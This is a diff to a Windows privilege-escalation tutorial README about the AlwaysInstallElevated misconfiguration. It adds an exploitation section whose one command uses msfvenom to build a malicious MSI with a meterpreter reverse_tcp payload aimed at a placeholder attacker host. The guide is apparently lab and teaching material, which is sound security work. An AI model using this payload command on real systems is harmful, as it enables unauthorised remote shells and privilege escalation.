@@ -9,12 +9,14 @@ This CookBook was created with the main purpose of helping people understand loc
 
 :information_source: This CookBook focuses only on misconfiguration vulnerabilities on Windows workstations/servers/machines.
 
+:warning: Evasion techniques to bypass security protections, endpoints, and antivirus are not included in this cookbook.
+
 The main structure of this CookBook includes the following sections:
 
 - Description (of the vulnerability)
 - Lab Setup
 - Enumeration
-- Attacking
+- Exploitation
 - Mitigation
 - (Useful) References
 
@@ -31,6 +33,7 @@ I hope to find this CookBook useful and learn new stuff 😉.
       - [Description](#description)
       - [Lab Setup](#lab-setup)
       - [Enumeration](#enumeration)
+      - [Exploitation](#exploitation)
   - [References](#references)
 
 ## Useful Tools
@@ -88,7 +91,7 @@ Open a cmd with local Administrator privileges and type `gpedit.msc` to open the
 
 ![AlwaysInstallElevated-User-Configuratior-6](/Pictures/AllwaysInstallElevated-User-6.png)
 
-7) Back to command prompt with local Administrator privileges and run this command to update computer policy:
+7) Open the command prompt with local Administrator privileges and execute the following command to update the computer policy:
 
 ```
 gpupdate /force
@@ -148,8 +151,27 @@ Outcome:
 
 :information_source: Moreover, you can use `SharpUp.exe audit` to perform a comprehensive enumeration of all misconfigurations and vulnerabilities on the specified machine.
 
+#### Exploitation
+
+##### Manual Exploitation
+
+##### Tool Exploitation
+
+To perform exploitation with [msfvenom](https://github.com/rapid7/metasploit-framework), you can use the following command to create a malicious MSI file:
+
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip_address> lport=<port> -f msi > nickvourd.msi
+```
+
+Outcome:
+
+
+
 ## References
 
 - [Privilege Escalation Wikipedia](https://en.wikipedia.org/wiki/Privilege_escalation)
 - [Microsoft AlwaysInstallElevated](https://learn.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated)
 - [SharpCollection GitHub by Flangvik](https://github.com/Flangvik/SharpCollection)
+- [Windows Installer Microsoft](https://learn.microsoft.com/en-us/windows/win32/msi/windows-installer-portal)
+- [How to Create the Windows Installer File (*.msi) Microsoft](https://learn.microsoft.com/en-us/mem/configmgr/develop/apps/how-to-create-the-windows-installer-file-msi)
+- [Metasploit Website](https://www.metasploit.com/)
